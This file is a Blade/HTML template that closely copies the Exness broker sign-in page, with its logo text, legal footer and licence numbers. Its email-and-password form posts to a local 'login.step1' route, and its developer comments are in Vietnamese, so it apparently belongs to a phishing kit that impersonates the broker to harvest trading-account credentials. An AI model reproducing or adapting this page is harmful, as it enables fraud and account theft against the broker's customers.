
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Welcome to Exness</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-white text-black flex flex-col min-h-screen">

<!-- Header -->
<header class="w-full flex items-center justify-between px-6 py-4 border-b border-gray-200">
    <span class="text-3xl font-semibold text-gray-900 tracking-tight">exness</span>
    <button aria-label="Language switch" class="w-6 h-6">
        <svg xmlns="http://www.w3.org/2000/svg"
             class="w-full h-full text-black"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
             stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M3 12a9 9 0 0118 0 9 9 0 01-18 0z"/>
            <path stroke-linecap="round" stroke-linejoin="round" d="M3.6 9h16.8"/>
            <path stroke-linecap="round" stroke-linejoin="round" d="M3.6 15h16.8"/>
            <path stroke-linecap="round" stroke-linejoin="round" d="M11.5 3a17 17 0 000 18"/>
            <path stroke-linecap="round" stroke-linejoin="round" d="M12.5 3a17 17 0 010 18"/>
        </svg>
    </button>
</header>

<!-- Main -->
<div class="flex-grow flex justify-center items-start pt-12">
    <div class="w-full max-w-md px-6">
        <h1 class="text-2xl font-bold mb-8">Welcome to Exness</h1>

        <!-- Hiển thị thông báo lỗi nếu có -->
        @if (session('error'))
            <div class="mb-6 p-4 bg-red-100 text-red-700 rounded-md text-sm">
                {{ session('error') }}
            </div>
        @endif

        <div class="flex border-b border-gray-200 mb-6">
            <span class="flex-1 text-center py-3 text-sm text-black font-semibold border-b-2 border-black cursor-pointer">Sign in</span>
            <span class="flex-1 text-center py-3 text-sm text-gray-500 cursor-pointer">Create an account</span>
        </div>

        <form method="POST" action="{{ route('login.step1') }}">
            @csrf
            <label for="email" class="text-xs block mb-1">Your email address</label>
            <input type="email" id="email" name="email" required class="w-full p-3 mb-5 border border-gray-300 rounded-md text-sm">

            <label for="password" class="text-xs block mb-1">Password</label>
            <input type="password" id="password" name="password" required class="w-full p-3 mb-6 border border-gray-300 rounded-md text-sm">

            <button type="submit" class="w-full py-3 bg-yellow-400 rounded-md text-sm font-semibold">Continue</button>
        </form>

        <!-- Line + Or sign in -->
        <div class="flex items-center my-6">
            <div class="flex-grow border-t border-gray-300"></div>
            <span class="mx-4 text-gray-600 text-sm">Or sign in with</span>
            <div class="flex-grow border-t border-gray-300"></div>
        </div>

        <button class="w-full py-3 bg-gray-100 border border-gray-300 rounded-md text-sm font-medium flex items-center justify-center gap-2">
            <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" class="w-5 h-5">
            Google
        </button>

        <div class="text-center mt-6">
            <a href="#" class="text-sm text-blue-600 hover:underline">I forgot my password</a>
        </div>
    </div>
</div>

<!-- Footer (KHÔNG border-t) -->
<div class="px-6 py-10 text-[13px] text-gray-700 flex flex-col lg:flex-row justify-between items-start max-w-7xl mx-auto">
    <!-- Legal -->
    <div class="max-w-4xl space-y-4 leading-relaxed">
        <p>
            Exness does not offer services to residents of certain jurisdictions including the USA, Iran, North Korea, the European Union,
            the United Kingdom and others. The content of the website including translations should not be construed as means for
            solicitation. Investors make their own and independent decisions.
        </p>
        <p>
            Trading in CFDs and generally leveraged products involves substantial risk of loss and you may lose all of your invested capital.
        </p>
        <p>
            Exness (SC) Ltd is a Securities Dealer registered in Seychelles with registration number 8423606-1 and authorised by the Financial
            Services Authority (FSA) with licence number SD025. The registered office of Exness (SC) Ltd is at 9A CT House, 2nd floor,
            Providence, Mahe, Seychelles.
        </p>
        <p>
            Exness B.V. is a Securities Intermediary registered in Curaçao with registration number 148698(0) and authorised by the Central Bank
            of Curaçao and Sint Maarten (CBCS) with licence number 0003LSI. The registered office of Exness B.V. is at Emancipatie Boulevard
            Dominico F. “Don” Martina 31, Curaçao.
        </p>
        <p>
            Exness (VG) Ltd is authorised by the Financial Services Commission (FSC) in BVI with registration number 2032226 and investment
            business licence number SIBA/L/20/1133. The registered office of Exness (VG) Ltd is at Trinity Chambers, P.O. Box 4301, Road Town,
            Tortola, BVI.
        </p>
        <p>
            The entities above are duly authorised to operate under the Exness brand and trademarks.
        </p>
        <p>
            Risk Warning: Our services relate to complex derivative products (CFDs) which are traded outside an exchange. These products come with
            a high risk of losing money rapidly due to leverage and thus are not appropriate for all investors. Under no circumstances shall Exness
            have any liability to any person or entity for any loss or damage in whole or part caused by, resulting from, or relating to any
            investing activity. <a href="#" class="text-blue-600 hover:underline">Learn more</a>
        </p>
        <p>
            The information on this website does not constitute investment advice or a recommendation or a solicitation to engage in any
            investment activity.
        </p>
        <p>
            The information on this website may only be copied with the express written permission of Exness.
        </p>
        <p>
            Exness complies with the Payment Card Industry Data Security Standard (PCI DSS) to ensure your security and privacy.
            We conduct regular vulnerability scans and penetration tests in accordance with the PCI DSS requirements for our business model.
        </p>
    </div>

    <!-- Links -->
    <div class="mt-8 lg:mt-0 lg:ml-10 text-sm text-blue-600 space-y-2 whitespace-nowrap">
        <a href="#" class="block hover:underline">Privacy Agreement</a>
        <a href="#" class="block hover:underline">Risk disclosure</a>
        <a href="#" class="block hover:underline">Preventing money laundering</a>
        <a href="#" class="block hover:underline">Security instructions</a>
        <a href="#" class="block hover:underline">Legal documents</a>
        <a href="#" class="block hover:underline">Complaints Handling Policy</a>
        <p class="text-gray-500 mt-4">&copy; 2008–2025. Exness</p>
    </div>
</div>

</body>
</html>
